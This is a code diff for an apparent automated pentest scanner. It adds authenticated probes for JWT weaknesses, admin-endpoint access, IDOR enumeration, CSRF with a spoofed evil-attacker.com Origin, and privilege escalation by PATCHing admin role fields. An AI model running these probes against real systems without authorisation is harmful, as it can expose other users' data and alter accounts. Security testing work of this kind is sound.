@@ -49,7 +49,7 @@ async function getSslCertInfo(hostname: string): Promise<{ issuer: string; expir
   });
 }
 
-async function httpProbe(
+async function _httpProbe(
   url: string,
   init: RequestInit = {},
   timeoutMs = 4000
@@ -68,7 +68,7 @@ async function httpProbe(
   }
 }
 
-async function httpProbeWithTiming(
+async function _httpProbeWithTiming(
   url: string,
   init: RequestInit = {},
   timeoutMs = 8000
@@ -143,7 +143,7 @@ async function attemptAxfr(ns: string, zone: string): Promise<boolean> {
   });
 }
 
-export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]> {
+export async function runPentagiExploit(url: string, authHeaders: Record<string, string> = {}): Promise<PentagiLogEntry[]> {
   const logs: PentagiLogEntry[] = [];
   const findings: FindingEntry[] = [];
   const t0 = Date.now();
@@ -154,6 +154,19 @@ export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]>
     logs.push({ time, agent, msg });
     console.log(`[PentAGI][${time}] ${agent}: ${msg}`);
   };
+
+  // Auth-aware probe wrappers — automatically inject authHeaders into every request.
+  // Probe-specific headers (e.g. a custom Origin) always override auth headers.
+  const httpProbe = (u: string, init: RequestInit = {}, timeoutMs = 4000) =>
+    _httpProbe(u, {
+      ...init,
+      headers: { ...authHeaders, ...(init.headers as Record<string, string> ?? {}) },
+    }, timeoutMs);
+  const httpProbeWithTiming = (u: string, init: RequestInit = {}, timeoutMs = 8000) =>
+    _httpProbeWithTiming(u, {
+      ...init,
+      headers: { ...authHeaders, ...(init.headers as Record<string, string> ?? {}) },
+    }, timeoutMs);
 
   let targetUrl = url.trim();
   if (!/^https?:\/\//i.test(targetUrl)) targetUrl = 'https://' + targetUrl;
@@ -1295,6 +1308,191 @@ export async function runPentagiExploit(url: string): Promise<PentagiLogEntry[]>
     }
   } else {
     log('Exploiter Agent', 'OAST blind probes skipped — set OAST_DOMAIN env var to enable out-of-band blind XSS/SSRF/RCE detection');
+  }
+
+  // 2u. AUTHENTICATED SCANNING PROBES (only when auth headers provided)
+  if (Object.keys(authHeaders).length > 0) {
+    const authHeaderNames = Object.keys(authHeaders).join(', ');
+    log('Exploiter Agent', `Authenticated scanning mode active — [${authHeaderNames}] injected into all probes for this session`);
+
+    // 2u-i. Verify auth actually works — probe common protected endpoints
+    log('Exploiter Agent', 'Verifying authentication — probing protected endpoints with provided credentials...');
+    const authVerifyEndpoints = [targetUrl, `${origin}/api/me`, `${origin}/api/user`, `${origin}/api/profile`, `${origin}/dashboard`];
+    const authVerifyResults = await Promise.all(authVerifyEndpoints.map(ep => httpProbe(ep)));
+    const confirmedEndpoints = authVerifyEndpoints.filter((_, i) => authVerifyResults[i]?.status === 200);
+    if (confirmedEndpoints.length > 0) {
+      log('Exploiter Agent', `Auth confirmed: ${confirmedEndpoints.length} endpoint(s) return HTTP 200 with provided credentials — authenticated probes active`);
+    } else {
+      log('Exploiter Agent', 'Auth warning: no tested endpoints returned HTTP 200 — credentials may be invalid, expired, or the app returns other status codes when authenticated');
+    }
+
+    // 2u-ii. JWT session token analysis
+    const bearerVal = authHeaders['Authorization'] || authHeaders['authorization'] || '';
+    const cookieVal = authHeaders['Cookie'] || authHeaders['cookie'] || '';
+    const jwtMatch = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/.exec(bearerVal) ||
+                     /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/.exec(cookieVal);
+    if (jwtMatch) {
+      log('Exploiter Agent', 'JWT session token detected — analyzing algorithm, claims, expiry, and sensitive fields...');
+      try {
+        const parts = jwtMatch[0].split('.');
+        const jwtHeader = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
+        const jwtPayload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
+
+        if (jwtHeader.alg === 'none' || jwtHeader.alg === 'None') {
+          log('Exploiter Agent', 'JWT CRITICAL: algorithm=none — signature not validated, token is fully forgeable');
+          findings.push({ severity: 'critical', title: 'JWT Session Token Uses Algorithm None (Completely Forgeable)' });
+        } else if (['HS256', 'HS384', 'HS512'].includes(jwtHeader.alg)) {
+          log('Exploiter Agent', `JWT uses symmetric HMAC (${jwtHeader.alg}) — secret brute-force possible; RS256→HS256 confusion applicable if public key exposed`);
+          findings.push({ severity: 'medium', title: `JWT Session Token Uses Symmetric Algorithm (${jwtHeader.alg}) — Secret Brute-Forceable` });
+        } else {
+          log('Exploiter Agent', `JWT algorithm: ${jwtHeader.alg} — asymmetric key required to forge`);
+        }
+
+        if (!jwtPayload.exp) {
+          log('Exploiter Agent', 'JWT has no expiry (exp claim absent) — non-expiring tokens cannot be invalidated after compromise');
+          findings.push({ severity: 'high', title: 'JWT Session Token Has No Expiry — Permanent Credential (Cannot Be Revoked)' });
+        } else {
+          const expDate = new Date(jwtPayload.exp * 1000);
+          const lifespanDays = jwtPayload.iat ? Math.floor((jwtPayload.exp - jwtPayload.iat) / 86400) : null;
+          if (lifespanDays && lifespanDays > 90) {
+            log('Exploiter Agent', `JWT lifespan: ${lifespanDays} days — tokens should expire within 24h to limit breach exposure`);
+            findings.push({ severity: 'medium', title: `Excessive JWT Lifespan: ${lifespanDays} Days (Recommended ≤ 1 Day)` });
+          } else {
+            log('Exploiter Agent', `JWT expiry: ${expDate.toISOString().split('T')[0]}${lifespanDays ? `, lifespan ${lifespanDays} days` : ''}`);
+          }
+        }
+
+        const sensitiveKeys = ['password', 'secret', 'key', 'api_key', 'ssn', 'card', 'cvv', 'pin', 'token'];
+        const leaked = sensitiveKeys.filter(k => jwtPayload[k] !== undefined);
+        if (leaked.length > 0) {
+          log('Exploiter Agent', `JWT payload leaks sensitive fields: ${leaked.join(', ')} — JWT payload is base64 (not encrypted), readable by anyone`);
+          findings.push({ severity: 'high', title: `Sensitive Fields in JWT Payload: ${leaked.join(', ')} (Token Is Not Encrypted)` });
+        }
+        if (jwtPayload.role || jwtPayload.isAdmin !== undefined || jwtPayload.admin !== undefined) {
+          log('Exploiter Agent', `JWT contains role/privilege claims: role=${jwtPayload.role ?? 'N/A'} admin=${jwtPayload.isAdmin ?? jwtPayload.admin ?? 'N/A'} — if these drive authorization decisions, tampering bypasses access control`);
+        }
+      } catch {
+        log('Exploiter Agent', 'JWT decode failed — token may be JWE (encrypted) or malformed');
+      }
+    }
+
+    // 2u-iii. BFLA — Broken Function Level Authorization
+    log('Exploiter Agent', 'Testing BFLA — accessing admin/privileged functions with regular user credentials...');
+    const adminPaths = [
+      '/admin', '/admin/', '/api/admin', '/api/admin/users', '/api/admin/config',
+      '/api/users', '/api/config', '/api/settings', '/management',
+      '/actuator', '/actuator/env', '/actuator/beans', '/api/v1/admin', '/api/v2/admin',
+    ];
+    const adminResults = await Promise.all(adminPaths.map(p => httpProbe(`${origin}${p}`)));
+    const bflaHits = adminPaths.filter((_, i) => {
+      const r = adminResults[i];
+      return r && r.status === 200 && r.body.length > 50;
+    });
+    if (bflaHits.length > 0) {
+      log('Exploiter Agent', `BFLA CONFIRMED — admin/privileged endpoints accessible: ${bflaHits.join(', ')}`);
+      findings.push({ severity: 'critical', title: `Broken Function Level Authorization (BFLA): ${bflaHits.slice(0, 3).join(', ')}` });
+    } else {
+      log('Exploiter Agent', 'BFLA: admin/privileged endpoints return 401/403 with regular user auth — function-level access controls appear enforced');
+    }
+
+    // 2u-iv. Authenticated IDOR — access other users' objects
+    log('Exploiter Agent', 'Testing authenticated IDOR — enumerating sequential object IDs cross-user with valid credentials...');
+    const idorAuthPaths = ['/api/users/', '/api/profiles/', '/api/accounts/', '/api/orders/', '/api/records/'];
+    let authIdorFound = false;
+    for (const idPath of idorAuthPaths) {
+      const idResults = await Promise.all([1, 2, 3, 4, 5].map(n => httpProbe(`${origin}${idPath}${n}`)));
+      const hits = idResults.filter(r => r && r.status === 200 && r.body.length > 10);
+      if (hits.length >= 2) {
+        const uniqueBodies = new Set(hits.map(r => r!.body.substring(0, 120)));
+        if (uniqueBodies.size > 1) {
+          log('Exploiter Agent', `Authenticated IDOR CONFIRMED at ${idPath}{id} — ${hits.length} sequential IDs return distinct user records with current auth credentials`);
+          findings.push({ severity: 'critical', title: `Authenticated IDOR/BOLA — Cross-User Data Exposed at ${idPath}{id}` });
+          authIdorFound = true;
+          break;
+        }
+      }
+    }
+    if (!authIdorFound) log('Exploiter Agent', 'Authenticated IDOR: no cross-user data exposure detected — object-level authorization appears enforced');
+
+    // 2u-v. CSRF bypass on authenticated state-changing endpoints
+    log('Exploiter Agent', 'Testing CSRF protection — submitting state-changing requests without CSRF token from foreign Origin...');
+    const csrfTargets = [
+      { url: `${origin}/api/profile`, method: 'PATCH' as const },
+      { url: `${origin}/api/settings`, method: 'POST' as const },
+      { url: `${origin}/api/user/update`, method: 'POST' as const },
+      { url: `${origin}/api/email`, method: 'POST' as const },
+    ];
+    let csrfBypassFound = false;
+    for (const ep of csrfTargets) {
+      const r = await httpProbe(ep.url, {
+        method: ep.method,
+        headers: { 'Content-Type': 'application/json', 'Origin': 'https://evil-attacker.com' },
+        body: JSON.stringify({ name: 'csrf-test', email: 'csrf@evil.com' }),
+      });
+      if (r && r.status === 200) {
+        log('Exploiter Agent', `CSRF bypass CONFIRMED at ${ep.url} — ${ep.method} accepted from evil-attacker.com without CSRF token`);
+        findings.push({ severity: 'high', title: `CSRF Protection Missing on Authenticated ${ep.method} ${ep.url.replace(origin, '')}` });
+        csrfBypassFound = true;
+        break;
+      }
+    }
+    if (!csrfBypassFound) log('Exploiter Agent', 'CSRF: all tested endpoints reject cross-origin requests or require CSRF tokens');
+
+    // 2u-vi. Privilege escalation via mass assignment (authenticated)
+    log('Exploiter Agent', 'Testing authenticated privilege escalation — injecting admin/role fields into profile update endpoints...');
+    const privEscEndpoints = [`${origin}/api/profile`, `${origin}/api/user`, `${origin}/api/me`, `${origin}/api/account`];
+    const privEscBody = JSON.stringify({ role: 'admin', isAdmin: true, admin: true, is_admin: 1, userType: 'admin', permissions: ['admin'] });
+    let privEscFound = false;
+    for (const ep of privEscEndpoints) {
+      const r = await httpProbe(ep, {
+        method: 'PATCH',
+        headers: { 'Content-Type': 'application/json' },
+        body: privEscBody,
+      });
+      if (r && r.status === 200) {
+        const verify = await httpProbe(ep);
+        if (verify && (verify.body.includes('"admin"') || verify.body.includes('"isAdmin":true') || verify.body.includes('"role":"admin"'))) {
+          log('Exploiter Agent', `Privilege escalation CONFIRMED at ${ep} — admin role assignment accepted and reflected in profile response`);
+          findings.push({ severity: 'critical', title: `Authenticated Privilege Escalation via Mass Assignment at ${ep.replace(origin, '')}` });
+          privEscFound = true;
+          break;
+        }
+      }
+    }
+    if (!privEscFound) log('Exploiter Agent', 'Privilege escalation: no admin role accepted via profile update endpoints');
+
+    // 2u-vii. Authenticated crawler — discover private pages not visible unauthenticated
+    log('Exploiter Agent', 'Running authenticated crawler to discover private pages not visible without credentials...');
+    const authCrawled = new Set<string>([targetUrl]);
+    const authQueue: Array<{ url: string; depth: number }> = [{ url: targetUrl, depth: 0 }];
+    const authOnlyPages: string[] = [];
+    while (authQueue.length > 0 && authCrawled.size < 20) {
+      const { url: cUrl, depth } = authQueue.shift()!;
+      if (depth >= 2) continue;
+      const cRes = await httpProbe(cUrl, {}, 4000);
+      if (!cRes || cRes.status !== 200) continue;
+      const links = [...cRes.body.matchAll(/href=["']([^"'#?]+)["']/gi)]
+        .map(m => { try { return new URL(m[1], cUrl).href; } catch { return null; } })
+        .filter((l): l is string => l !== null && l.startsWith(origin) && !authCrawled.has(l));
+      for (const link of [...new Set(links)].slice(0, 6)) {
+        authCrawled.add(link);
+        authQueue.push({ url: link, depth: depth + 1 });
+        // Check if this page would be blocked unauthenticated
+        const anonRes = await _httpProbe(link, {}, 3000);
+        if (!anonRes || anonRes.status === 401 || anonRes.status === 403 || anonRes.status === 302) {
+          authOnlyPages.push(link.replace(origin, ''));
+        }
+      }
+    }
+    if (authOnlyPages.length > 0) {
+      log('Exploiter Agent', `Authenticated crawler found ${authOnlyPages.length} private page(s) only accessible with credentials: ${authOnlyPages.slice(0, 5).join(', ')}`);
+      findings.push({ severity: 'low', title: `${authOnlyPages.length} Private Page(s) Discovered via Authenticated Crawl (Attack Surface Expanded)` });
+    } else {
+      log('Exploiter Agent', 'Authenticated crawler: no additional private pages found beyond unauthenticated crawl result');
+    }
+
+  } else {
+    log('Exploiter Agent', 'Unauthenticated scan — provide an auth profile to enable BFLA, authenticated IDOR, JWT analysis, CSRF bypass, and privilege escalation probes');
   }
 
   // ==========================================================
